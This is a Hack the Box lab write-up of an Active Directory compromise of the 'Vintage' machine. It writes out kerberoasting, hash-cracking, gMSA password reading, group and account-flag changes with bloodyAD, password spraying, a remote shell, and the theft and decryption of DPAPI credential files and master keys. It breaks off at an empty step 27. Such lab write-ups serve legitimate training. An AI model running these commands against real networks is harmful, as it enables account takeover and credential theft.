# Vintage

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Hard**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Use ldapsearch for AD enumeration
- Learned that Netexec by default filters out machine accounts when kerberoasting because machine accounts normally have very strong passwords set by default. However, this is not always the case like here, and is kerberoastable/crackable.
- Found what security implementations the Protected Users group has by default (Stronger AES encryption on TGTs, disabling NTLM hash and caching credentials, TGTs expire in 4 hours, etc.)
- Learned that having AddMember privileges can also mean having RemoveMember rights. Also learned that one can remove not only users from groups, but groups from groups using bloodyAD
- Became familiar with using tools that don't rely on SMB and use Kerberos authentication (ldapsearch and bloodyAD -k vs net rpc)


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

<img width="910" height="512" alt="image" src="https://github.com/user-attachments/assets/2e7f4510-5dd6-4c18-8edb-6eae734e1d96" />

2. Ldap port 389 confirms we're dealing with a Windows Domain Controller. The very first thing I try with domain user credentials is kerberoasting using Impacket's GetUserSPNs.py

`GetUserSPNs.py vintage.htb/p.rosa:Rosaisbest123 -dc-ip 10.129.85.186 -request`

<img width="915" height="148" alt="image" src="https://github.com/user-attachments/assets/744fc9e1-7d01-4922-a5a8-a5bbb7be34c6" />

3. However, we run into an error saying NTLM is disabled. So try again with the `-k` flag for kerberos authentication

`GetUserSPNs.py vintage.htb/p.rosa:Rosaisbest123 -dc-ip 10.129.85.186 -request -k -dc-host dc.vintage.htb`

<img width="914" height="143" alt="image" src="https://github.com/user-attachments/assets/76ce253d-4a40-4d6d-a1ab-454be4d43b3c" />

4. After trying other dead ends (like SMB enumeration and AS-REP Roasting after getting a list of usernames with NetExec LDAP), we try kerberoasting again but this time, with NetExec and the debug flag

`nxc ldap dc01.vintage.htb -u p.rosa -p 'Rosaisbest123' -d vintage.htb -k --kerberoasting kerberoast.txt --debug`

<img width="912" height="839" alt="image" src="https://github.com/user-attachments/assets/fb8b93c3-6efb-48e8-abae-f27c92162d73" />

5. It turns out, NetExec by default removes machine accounts from the Kerberoast search filter. This is because machine account hashes are normally generated by the machine and are nearly uncrackeable. However, there may be exceptions so we change the filter to include them and try again. We do this by modifying the ldap.py file

`nxc ldap dc01.vintage.htb -u p.rosa -p 'Rosaisbest123' -d vintage.htb -k --kerberoasting kerberoast.txt --debug`

<img width="727" height="243" alt="image" src="https://github.com/user-attachments/assets/ed885d47-ef6d-4987-b1e0-6ce67090e499" />

6. This time, it's a success! We get 2 hashes and we crack them offline with hashcat.

`hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`

<img width="1733" height="475" alt="image" src="https://github.com/user-attachments/assets/b2faa4f8-b1e2-4076-9992-832d48a7c7e0" />

7. However, they are not crackeable. With no other leads left, I try kerberoasting one last time with Impacket's GetUserSPNs script and giving it the list of usernames. And success! We got one more hash for the krbtgt account

`GetUserSPNs.py vintage.htb/P.Rosa:Rosaisbest123 -dc-ip 10.129.85.186 -request -k -dc-host dc01.vintage.htb -usersfile users.list`

<img width="915" height="879" alt="image" src="https://github.com/user-attachments/assets/798df541-b7b5-4230-b40e-8202e122270f" />

8. Since this is a $krb5tgs$18 hash, we attempt to crack offline using hashcat module 19700

`hashcat -m 19700 krbtgt_kerberoast.hash /usr/share/wordlists/rockyou.txt`

9. However, the hash doesn't crack again and after much headache, we discover on Bloodhound that the FS01$ account is a member of the PRE-WINDOWS 2000 COMPATIBLE ACCESS group. According to this article, Pre-Windows 2000 computers have its password set based on it name. https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers

<img width="586" height="390" alt="image" src="https://github.com/user-attachments/assets/10020a8e-0d0e-426b-b25e-5609b40a2199" />

10. We check FS01's password with netexec and success!

`nxc ldap dc01.vintage.htb -u 'FS01$' -p 'fs01' -k`

<img width="767" height="61" alt="image" src="https://github.com/user-attachments/assets/cf22abc6-bb1d-4b30-a638-d8f80ebf6d88" />

11. FS01$ is part of the Domain Computers group, which has ReadGMSAPassword permission on account GMSA01$. We retrieve the GMSA password using bloodyAD

`bloodyAD -k --dc-ip 10.129.231.205 --host dc01.vintage.htb -u 'FS01$' -p 'fs01' -d vintage.htb get object 'gMSA01$' --attr msDS-ManagedPassword`

<img width="911" height="155" alt="image" src="https://github.com/user-attachments/assets/d3d0cbbb-3ce2-477e-9b3e-aa38795520da" />

12. With Bloodhound, we find our next attack path: GMSA01$ has AddSelf and GenericWrite rights on the SERVICEMANAGERS group, which also has GenericAll privileges on 3 service accounts. We will add our GMSA01$ user to the group and do a Targeted Kerberoast attack on the 3 accounts.

<img width="865" height="280" alt="image" src="https://github.com/user-attachments/assets/bc21ca18-c300-4bb8-bd0b-dfed3648bad2" />

<img width="1027" height="417" alt="image" src="https://github.com/user-attachments/assets/c18a9651-1a85-42f2-811a-8e7c82630f25" />

13. First, we need to get a Ticket Granting Ticket as the GMSA01$ user using impacket's getTGT.py script and set the ticket as the KRB5CCNAME environment variable.

`getTGT.py -hashes $(cat user/gmsa01\$.ntlm_hash) 'vintage.htb/GMSA01$@dc01.vintage.htb'`

`export KRB5CCNAME=GMSA01$@dc01.vintage.htb.ccache`

<img width="741" height="205" alt="image" src="https://github.com/user-attachments/assets/f78e3e78-5f58-4fd4-a461-e860b9029907" />

14. Now add our account to the Service Managers group using BloodyAD

`bloodyAD -k --dc-ip 10.129.231.205 --host dc01.vintage.htb -u 'GMSA01$' -d vintage.htb add groupMember SERVICEMANAGERS 'GMSA01$'`

<img width="911" height="57" alt="image" src="https://github.com/user-attachments/assets/d21b1df3-cabb-471b-83ca-5947aa03dd86" />

15. We now conduct the Targeted Kerberoast attack 

`targetedKerberoast.py -d vintage.htb -u 'GMSA01$' -k --dc-host dc01.vintage.htb`

<img width="914" height="729" alt="image" src="https://github.com/user-attachments/assets/4ff87033-1158-4646-b11d-5b012fdb47e8" />

16. However, we only get back 2 hashes, not 3. Checking Bloodhound again, it turns out the svc_sql account is disabled.

<img width="630" height="585" alt="image" src="https://github.com/user-attachments/assets/faadf77b-533b-4042-a24e-be4edf1d53c9" />

17. Enable the svc_sql account using bloodyAD

`bloodyAD -k --dc-ip 10.129.231.205 --host dc01.vintage.htb -f rc4 -u 'GMSA01$' -p [NT_HASH] -d vintage.htb remove uac svc_sql -f ACCOUNTDISABLE`

<img width="914" height="63" alt="image" src="https://github.com/user-attachments/assets/9c1363f6-642a-4f4b-913c-b6a7f7dec63a" />

18. Do the Targeted Kerberoast attack again and we get back 3 hashes this time

<img width="909" height="1060" alt="image" src="https://github.com/user-attachments/assets/ffb00fe5-33f4-4ee0-9345-253be65a6737" />

19. Cracking the hashes with hashcat gives us the plaintext password for the svc_sql user

`hashcat -m 13100 targetedKerberoast.txt /usr/share/wordlists/rockyou.txt`

<img width="912" height="332" alt="image" src="https://github.com/user-attachments/assets/091b1141-1cdf-4488-935e-9ae80c408ec9" />

20. With svc_sql's password, we do a password spray attack to see if there's any password reuse and find the user C.Neri has the same password as svc_sql

<img width="912" height="205" alt="image" src="https://github.com/user-attachments/assets/4137eae6-7959-4228-887c-dab9b97d84b4" />

21. The user C.Neri can PSRemote into the machine, so we get shell access via evil-winrm (after making sure to add the realm to /etc/krb5.conf) and retrieve the user flag!

`evil-winrm -i dc01.vintage.htb -r vintage.htb`

<img width="569" height="149" alt="image" src="https://github.com/user-attachments/assets/4df27086-92a9-4347-b752-66390b8c5026" />

22. Now that we're in the machine, we do some basic enumeration and pillaging. We come across a hidden credentials file that's encrypted with DPAPI.

<img width="679" height="163" alt="image" src="https://github.com/user-attachments/assets/495bbddf-5a86-4b22-b0e4-7c1b0907cd32" />

23. Evil-winrm doesn't allow us to just download the file for some reason, so we encode the file contents with base64 and transfer it over to our local machine.

`[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"))`

<img width="912" height="134" alt="image" src="https://github.com/user-attachments/assets/ae94b9d0-f2ab-4737-aa80-553da7280f02" />

24. We do the same for the DPAPI keys

`[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"))`

<img width="914" height="202" alt="image" src="https://github.com/user-attachments/assets/3bd5eda6-ea55-42cf-b7e0-c495bebc4a81" />

`[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\C.Neri\AppData\Roaming\Microsoft\protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"))`

<img width="913" height="206" alt="image" src="https://github.com/user-attachments/assets/113b47d8-7566-4989-ab20-a7c210e35fee" />

25. After decoding the base64 files, we proceed to decrypt the DPAPI files. We will first decrypt the 2 masterkeys and then try both to see which one decrypts the credential file. So first, using dpapi.py, we decode the 2 DPAPI masterkeys

`dpapi.py masterkey -file dpapi1.key -sid $(cat c.neri.sid) -password $(cat ../user/svc_sql.pass)`

`dpapi.py masterkey -file dpapi2.key -sid $(cat c.neri.sid) -password $(cat ../user/svc_sql.pass)`

<img width="912" height="720" alt="image" src="https://github.com/user-attachments/assets/f3e7ba12-f705-4a90-ae80-be6dc3ac4c25" />

26. Now with the 2 masterkeys, we try decrypting the credential file using dpapi.py again

`dpapi.py credential -file credentials.txt -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a`

<img width="912" height="313" alt="image" src="https://github.com/user-attachments/assets/86f184de-577c-4c71-9462-4739b444acd7" />

27. 
